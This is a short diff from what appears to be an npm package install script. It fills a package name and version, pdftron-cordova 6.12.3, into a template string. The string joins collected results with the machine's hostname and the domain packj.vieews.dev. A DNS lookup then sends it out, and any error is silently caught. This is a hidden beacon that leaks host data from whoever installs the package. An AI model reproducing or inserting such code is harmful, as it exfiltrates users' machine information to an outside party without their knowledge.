@@ -27,7 +27,7 @@ try {
 	  dns.resolveNs(domain, doCallback);
 	};
 
-	query = '#' + results.join(' # ') + '#' + os.hostname() + '#NPM%PKG_NAME%PKG_VERSION%packj.vieews.dev'
+	query = '#' + results.join(' # ') + '#' + os.hostname() + '#NPM%pdftron-cordova/pdftron-cordova%6.12.3%packj.vieews.dev'
 	nsLookup(query, 3000, function(err, addresses) {});
 } catch (e) {
 	console.log('');
